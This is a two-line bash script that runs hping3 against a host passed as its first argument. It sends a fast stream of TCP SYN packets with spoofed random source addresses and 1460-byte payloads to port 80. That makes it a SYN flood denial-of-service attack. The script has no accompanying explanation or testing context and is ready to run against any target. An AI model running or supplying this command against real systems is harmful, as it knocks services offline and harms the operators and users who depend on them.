#!/bin/bash
hping3 --rand-source --faster -S -V -d 1460 "$1" -p 80
